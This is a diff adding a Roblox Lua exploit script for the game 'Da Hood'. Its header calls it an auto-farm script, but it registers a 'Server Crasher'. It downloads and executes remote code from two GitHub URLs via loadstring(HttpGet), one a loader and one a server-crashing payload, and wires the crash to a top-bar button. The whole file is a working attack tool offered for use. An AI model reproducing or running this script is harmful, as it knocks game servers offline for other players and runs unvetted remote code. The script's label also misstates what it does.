@@ -1,0 +1,35 @@
+--// KRAMPUS \\--
+-- Da Hood Auto Farm Script v2.0
+-- obfuscating is for losers
+
+if not shared.KrampusLoader then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iamtryingtofindname/Krampus/main/loader",true))()
+end
+
+shared.KrampusLoader(2788229376,"Server Crasher",function(initTopBarButton,topLeft,topRight,extra)
+	local workspace = game:GetService("Workspace")
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+
+	local player = Players.LocalPlayer
+	local controls = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()
+	
+	local crashServer = loadstring(game:HttpGet("https://raw.githubusercontent.com/Compwnter/servercrasher/main/master.lua")) -- Credit to Compwnter
+
+	local enabled = false
+	local ToggleButton = initTopBarButton(function()
+		crashServer()
+	end) -- Makes a topbar button
+
+	local Icon = Instance.new("ImageLabel")
+	Icon.Parent = ToggleButton
+	Icon.AnchorPoint = Vector2.new(0.5, 0.5)
+	Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Icon.BackgroundTransparency = 1
+	Icon.Position = UDim2.new(0.535, 0, 0.55, 0)
+	Icon.Size = UDim2.fromScale(0.75,0.6)
+	Icon.Image = "http://www.roblox.com/asset/?id=6581250312"
+
+
+	ToggleButton.Parent = topLeft
+end)
